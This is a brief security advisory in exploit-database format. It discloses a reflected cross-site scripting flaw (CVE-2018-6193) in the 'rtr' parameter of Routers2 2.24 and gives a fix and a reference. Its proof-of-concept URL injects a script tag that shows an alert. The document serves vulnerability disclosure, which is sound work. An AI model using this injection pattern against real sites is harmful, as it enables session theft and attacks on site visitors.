@@ -1,0 +1,27 @@
+# Exploit Title: Routers2 2.24 - Reflected Cross-Site Scripting
+# Date: 18-01-18
+# Vendor Homepage: http://www.steveshipway.org/software/
+# Software Link: https://github.com/sshipway/routers2
+# Version: 2.24
+# CVE: CVE-2018-6193
+# Platform: Perl
+# Category: webapps
+# Exploit Author: Lorenzo Di Fuccia
+# Contact: lorenzo.difuccia@gmail.com
+# Website: https://github.com/lorenzodifuccia
+
+1. Description
+
+Routers2 is vulnerable to Reflected Cross-Site Scripting, affecting the 'rtr' GET parameter in a page=graph action to `cgi-bin/routers2.pl`.
+
+2. Proof of Concept
+
+http://router.com/cgi-bin/routers2.pl?rtr=--><script>alert("XSS")</script>&bars=Cami&xgtype=d&page=graph&xgstyle=l2&xmtype=routers
+
+3. Solution
+
+Update the program cloning the repo from GitHub or disable the 'paranoia' setting in the web section of the `routers2.conf`.
+
+4. References
+
+https://github.com/sshipway/routers2/issues/1
